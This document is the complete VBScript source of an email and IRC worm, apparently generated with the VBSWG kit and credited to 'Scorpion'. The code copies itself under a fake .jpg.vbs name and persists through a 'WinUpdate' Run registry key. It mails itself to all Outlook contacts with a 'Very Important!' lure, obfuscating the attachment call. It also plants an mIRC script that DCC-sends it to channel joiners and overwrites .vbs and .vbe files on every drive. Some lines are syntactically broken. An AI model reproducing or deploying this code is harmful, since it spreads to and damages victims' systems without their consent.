'Vbs.Vbswg.Vbswg Worm Created By Scorpion. 8/29/2004
Set CAA23915 = createobject("scripting.filesystemobject")
CLJ44F4A = CAA23915.getspecialfolder(0)
KJ6Q4885 = CLJ44F4A & "\Vbswg_Worm.jpg.vbs"
Set OJEA7C6Q = createobject("wscript.shell")
OJEA7C6Q.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & KJ6Q4885 & " %"
CAA23915.copyfile wscript.scriptfullname, KJ6Q4885
If OJEA7C6Q.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Vbswg Worm\H3NH1763") <> 1 then
I1H77L6J
End if
If OJEA7C6Q.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Vbswg Worm\U6S5A2Q0") <> 1 then
NM62MUB4 ""
End if

Function I1H77L6J()
Set R128F764 = CreateObject("Outlook.Application")
If R128F764 = "Outlook" Then
Set CFP7JU61 = R128F764.GetNameSpace("MAPI")
Set V6625JRS = CFP7JU61.AddressLists
For Each L2LK1LPK In V6625JRS
If L2LK1LPK.AddressEntries.Count <> 0 Then
A1V50643 = L2LK1LPK.AddressEntries.Count
For IL8R4N11 = 1 To A1V50643
Set MGF131IC = R128F764.CreateItem(0)
Set NT29EGB2 = L2LK1LPK.AddressEntries(IL8R4N11)
MGF131IC.To = NT29EGB2.Address
MGF131IC.Subject = "Very Important!"
MGF131IC.Body = "Hi:" & vbcrlf & "Please view this file, it's very important." & vbcrlf & ""
execute "set J8288574 =MGF131IC." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
DG65CAHN = KJ6Q4885
MGF131IC.DeleteAfterSubmit = True
J8288574.Add DG65CAHN
If MGF131IC.To <> "" Then
MGF131IC.Send
End If
Next
End If
Next
End If
End function
Function NM62MUB4(HI72RCED)
If HI72RCED <> "" Then
VGVNA586 = OJEA7C6Q.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If CAA23915.fileexists("c:\mirc\mirc.ini") Then
HI72RCED = "c:\mirc"
ElseIf CAA23915.fileexists("c:\mirc32\mirc.ini") Then
HI72RCED = "c:\mirc32"
ElseIf CAA23915.fileexists(VGVNA586 & "\mirc\mirc.ini") Then
HI72RCED = VGVNA586 & "\mirc"
ElseIf CAA23915.fileexists(VGVNA586 & "\mirc32\mirc.ini") Then
HI72RCED = VGVNA586 & "\mirc"
Else
HI72RCED = ""
End If
End If
If HI72RCED <> "" Then
Set TISE65P1 = CAA23915.CreateTextFile(HI72RCED & "\script.ini", True)
TISE65P1 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
TISE65P1 = TISE65P1 & vbCrLf & "n0=on 1:JOIN:#:{"
TISE65P1 = TISE65P1 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
TISE65P1 = TISE65P1 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
TISE65P1 = TISE65P1 & KJ6Q4885
TISE65P1 = TISE65P1 & vbCrLf & "n3=}"
script.Close
End If
End Function
Function T885LJ2H()
On Error Resume Next
Set J4734S1U = CAA23915.Drives
For Each CJQ91B6A In J4734S1U
G8T685C1 = CJQ91B6A & " \ "
Call NC756RS8(G8T685C1)
Next
End Function

Function NC756RS8(K4R4G7GP)
ES3B27OC = K4R4G7GP
Set P13V7NM2 = CAA23915.GetFolder(ES3B27OC)
Set I6HC5E3K = P13V7NM2.Files
For Each G4E1AA95 In I6HC5E3K
If CAA23915.GetExtensionName(G4E1AA95.path) = "vbs"
CAA23915.CopyFile wscript.scriptfullname,G4E1AA95.path,true
End if
If CAA23915.GetExtensionName(G4E1AA95.path) = "vbe"
CAA23915.CopyFile wscript.scriptfullname,G4E1AA95.path,true
End if
Next
Set MFFLUN7E = P13V7NM2.Subfolders
For Each DA079P43 In MFFLUN7E
Call (DA079P43.path)
Next
End function
'Vbswg 2 Beta. By [K]
